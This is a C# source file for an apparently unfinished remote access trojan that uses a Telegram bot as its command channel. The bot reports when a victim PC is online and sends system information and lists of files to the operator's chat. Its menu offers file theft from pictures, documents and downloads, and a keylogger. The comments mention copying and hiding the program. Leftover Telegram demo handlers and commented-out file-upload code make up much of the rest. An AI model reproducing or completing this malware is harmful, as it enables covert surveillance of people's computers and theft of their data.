﻿using RAT_BotTelegram.Lib;
using System;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Requests;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace RAT_BotTelegram {
    class Program {
        private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);



        // Debes escribir el ID, para que el bot solo te responda a tí.
        static void Main(string[] args) {

            // Copiar
            // Esconder

            //Método que se ejecuta cuando se recibe un mensaje
            Bot.OnMessage += BotOnMessageReceived;

            //Método que se ejecuta cuando se recibe un callbackQuery
            Bot.OnCallbackQuery += BotOnCallbackQueryReceived;

            //Método que se ejecuta cuando se recibe un error
            Bot.OnReceiveError += BotOnReceiveError;
            string path = @"O:\OneDrive - xKx\Pictures\Gif\Windows logos.gif";



            //Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
            //Bot.SendPhotoAsync(config.id, File.Open(path, FileMode.Open));
            //Bot.SendVideoAsync(config.id, path);
            

            // Mensaje de conexión

            Bot.SendTextMessageAsync(config.id, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");


            // Escucha servidor
            Bot.StartReceiving();
            Console.ReadLine();
            Console.WriteLine("La maquina se lenvantó ");
            Bot.StopReceiving();
        }

        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
            var message = messageEventArgs.Message;

            if (message == null || message.Type != MessageType.Text) return;

            switch (message.Text.Split(' ').First()) {
                //Enviar un inline keyboard con callback

                //  /GetDir_Document <Obtiene toda la lista>
                //  /GetDir_Music    <Está en desarrollo>
                //  /GetDir_Download <Está en desarrollo>
                //  /GetDir_Videos   <Está en desarrollo>
                //  /GetDir_Pictures <Está en desarrollo>
                //  /Get_Desktop  <Está en desarrollo>
                //  /Get_Key      <Está en desarrollo>




                case "/Status": // Verifica Si la PC se encuentra en linea
                    await Bot.SendTextMessageAsync(config.id, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                    break;
                case "/Get_Information":
                    await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                    break;

                //case "/GetDir_Document":
                //    await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
                //    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
                //    //string[] authorsList = authors.Split(", ")


                //    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                //        FileInfo info = new FileInfo(file);
                //        Console.WriteLine("File: " + info);
                //        await  Bot.SendTextMessageAsync(config.id, file);

                //        //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
                //        //await Bot.SendDocumentAsync(chatId: config.id,);
                //        //await Bot.SendDocumentAsync(
                //        //chatId: callbackQuery.Message.Chat.Id,
                //        //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                //        //);


                //        // Do something with the Folder or just add them to a list via nameoflist.add();

                //    }
                //    await Bot.SendTextMessageAsync(config.id,"Elija una opción");
                //    break;

                case "/Get_Files":  // Menú Obtiene archivos
                    //foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                    //    FileInfo info = new FileInfo(file);

                    //    var archivo = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData(text: info + "", callbackData: "GetDocument") });

                    //    await Bot.SendTextMessageAsync(config.id, "Se obtuvo...", replyMarkup: archivo);
                    //    //await Bot.SendTextMessageAsync(config.id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
                    //}
                    var GetFiles = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text: "Get Pictures",
                            callbackData: "GetPictures"),
                        InlineKeyboardButton.WithCallbackData(
                            text: "Get Videos",
                            callbackData: "GetVideos"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"Get Documents",
                            callbackData: "GetDocument"),
                        InlineKeyboardButton.WithCallbackData(
                            text:"Get Music",
                            callbackData: "GetMusic"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(
                            text:"Get Download",
                            callbackData: "getDownload")
                    }});

                    //var GetFiles = new InlineKeyboardMarkup

                    //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
                    await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
                    // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");

                    break;
                //Mensaje por default
                default:
                    const string usage =
                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                  " * Use the following commands: *\n" +
                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                  "\n/Status                 <Check if the PC is online>" +
                  "\n/Get_Information <get detailed system information>" +
                  "\n/Get_Files          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                  "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                  "\n/Keylogger       |Menu| <keylogger Options >" +
                  "\n" +
                  "\n" +
                  "\n" +
                  "";
                    await Bot.SendTextMessageAsync(config.id, text: usage, replyMarkup: new ReplyKeyboardRemove());
                    break;
            }
        }

       

        public string getTypeFile(string File) {
            String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
            String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
            String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx" };
            String[] imagen = { "ico", "jpe", "jpe", "jpeg", "png", "bmp" };
            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};

            return ""; // Extension File
        }

        private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
            string GetFileName(string dir) {   // Retorna solo el nombre del archivo
                                              //string path = @"D:\PNG Icons\System Win 10\camera.png";
                try {
                    /* Utiliza la variable para obtener el ultimo contendor 
                     * =Ejemplo:
                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
                     * [Despues]  path =  "Contenedor3"                                                     */
                    int palabraClave = dir.LastIndexOf(@"\");
                    dir = dir.Substring(palabraClave + 1);
                } catch {
                    dir = "Hubo un problema"; // Hubo un problema 
                }

                return dir;  // NameFile
            }
            string GetFileType(string File) {
                /* Utiliza la variable para obtener el ultimo contendor 
                 * =Ejemplo:
                 * [Antes]    path = "SoyUnaImagen.png" 
                 * [Despues]  path =  "[Imagen]"             */

               string dir = GetFileName(File);
               string dir2 = dir;       // Solo antibuggeo
                try {
                    /* Utiliza la variable para obtener el ultimo contendor 
                     * =Ejemplo:
                     * [Antes]    path = "SoyUnaImagen.png" 
                     * [Despues]  path =  "png"                                                     */
                int palabraClave = dir.LastIndexOf(".");
                    dir = dir.Substring(palabraClave + 1);
                } catch {
                    return  "[-]";
                }

                String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
                String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
                String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx" };
                String[] imagen = { "jpeg", "png", "bmp","ico", "jpe", "jpe" };
                //String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                //                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                //                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
                //                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};

                // Verifica si el archivo es una imagen
                foreach (string ext in imagen) {
                    if (ext == dir) {
                        Console.WriteLine(dir2+"<= es una Imagen");  // Solo debug
                        return "[Imagen]";
                    }
                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                }
                // Verifica si el archivo es una video 
                foreach (string ext in video) {
                    if (ext == dir) {
                        Console.WriteLine(dir2 + "<= es un Video");  // Solo debug
                        return "[Video]";
                    }
                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                }
                // Verifica si el archivo es un Adudio
                foreach (string ext in audio) {
                    if (ext == dir) {
                        Console.WriteLine(dir2 + "<= es un Audio");  // Solo debug
                        return "[Audio]";
                    }
                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                }
                // Verifica si el archivo es un Documento
                foreach (string ext in doc) {
                    if (ext == dir) {
                        Console.WriteLine(dir2 + "<= es un Audio");  // Solo debug
                        return "[Doc]";
                    }
                    Console.WriteLine(dir2 + " No tiene la ext " + ext);  // Solo debug
                }

                return "[-]"; // Extension File
            }

            







            var callbackQuery = callbackQueryEventArgs.CallbackQuery;

            

            switch (callbackQuery.Data) {


                case "GetDocument":

                    string ruta = @"O:\OneDrive - xKx\Pictures\Game resources - Sprites\Lazer o balas\transparent-laser-pixel.doc";
                    Console.WriteLine("Nombre: " + GetFileName(ruta) + "\n tipo:" + GetFileType(ruta));

                    await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                        //FileInfo info = new FileInfo(file);
                        //await Bot.SendTextMessageAsync(config.id, "<| " + file + info + " |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
                        //await Bot.SendDocumentAsync(config.id, Telegram.Bot.Types.InputFiles.InputOnlineFile file);
                       
                        await Bot.SendTextMessageAsync(config.id, file);
                        //await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open));
                    }
                    await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
                    break;

                case "GetDocumenttgert":
                    await Bot.SendLocationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f
                        );
                    break;

                //      text: "Get Pictures",
                //      callbackData: "GetPictures"),
                //    InlineKeyboardButton.WithCallbackData(
                //        text: "Get Videos",
                //        callbackData: "GetVideos"),
                //},new []{
                //    InlineKeyboardButton.WithCallbackData(
                //        text:"Get Documents",
                //        callbackData: "GetDocument"),
                //    InlineKeyboardButton.WithCallbackData(
                //        text:"Get Music",
                //        callbackData: "GetMusic"),
                //},new []{
                //    InlineKeyboardButton.WithCallbackData(
                //        text:"Get Download",
                //        callbackData: "getDownload"),
                case "GetDocumensdfdst":
                    await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");

                    ReplyKeyboardMarkup tipoContacto = new[]
                    {
                        new[] { "Opción 1", "Opción 2" },
                        new[] { "Opción 3", "Opción 4" },
                    };

                    await Bot.SendTextMessageAsync(chatId: callbackQuery.Message.Chat.Id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
                    break;

                case "venue":
                    await Bot.SendVenueAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f,
                        title: "Cenfotec",
                        address: "San José, Montes de Oca"
                        );
                    break;

                case "imagen":
                    await Bot.SendPhotoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        photo: "https://www.google.co.cr/imgres?imgurl=https%3A%2F%2Fwww.pcactual.com%2Fmedio%2F2017%2F07%2F05%2Ftelegram_960x540_0aa1aeac.jpg&imgrefurl=https%3A%2F%2Fwww.pcactual.com%2Fnoticias%2Factualidad%2Fsoy-fan-telegram_13549&docid=UZhcuJ9275t8zM&tbnid=otB1G_5L3DD0sM%3A&vet=10ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ..i&w=960&h=540&bih=722&biw=1536&q=telegram%20image&ved=0ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ&iact=mrc&uact=8"
                        );
                    break;

                case "animation":
                    await Bot.SendAnimationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        animation: "https://techcrunch.com/wp-content/uploads/2015/08/safe_image.gif?w=730&crop=1"
                        );
                    break;

                case "video":
                    await Bot.SendVideoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        video: "https://res.cloudinary.com/dherrerap/video/upload/v1560039252/WhatsApp_Video_2019-06-08_at_6.10.54_PM.mp4"
                        );
                    break;

                case "document":
                    await Bot.SendDocumentAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                        );
                    break;

                case "formato":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<b>bold</b>, <strong>bold</strong>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<i>italic</i>, <em>italic</em>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<a href='http://www.example.com/'>inline URL</a>",
                        parseMode: ParseMode.Html
                        );
                    break;

                case "reply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "ID: " + callbackQuery.Message.MessageId + " - " + callbackQuery.Message.Text,
                        replyToMessageId: callbackQuery.Message.MessageId);
                    break;

                case "contacto":
                    await Bot.SendContactAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        phoneNumber: "2222-2222",
                        firstName: "Jane",
                        lastName: "Doe"
                        );
                    break;

                case "forceReply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Forzar respuesta a este mensaje",
                        replyMarkup: new ForceReplyMarkup());
                    break;

                case "reenviar":
                    await Bot.ForwardMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        fromChatId: callbackQuery.Message.Chat.Id,
                        messageId: callbackQuery.Message.MessageId
                        );
                    break;
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
            Console.WriteLine("Received error: {0} — {1}",
                receiveErrorEventArgs.ApiRequestException.ErrorCode,
                receiveErrorEventArgs.ApiRequestException.Message);
        }
        private static void Bot_OnMessagesdsd(object sender, Telegram.Bot.Args.MessageEventArgs e) {

            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {

                if (e.Message.Text == "/PC_Info") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, Tools.PC_Info());

                } else if (e.Message.Text == "/GetDir_Document") {



                    //string[] allfiles = fea.GetFile(@"O:\OneDrive - xKx\Pictures")
                    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
                    //Tools.GetFile(@"O:\Estoo");
                    //string[] authorsList = authors.Split(", ")
                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                        FileInfo info = new FileInfo(file);
                        Console.WriteLine("File: " + info);
                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
                        // Bot.SendDocumentAsync(e.Message.Document.);
                        // Do something with the Folder or just add them to a list via nameoflist.add();

                    }

         
                }


            }

        }
    }
}
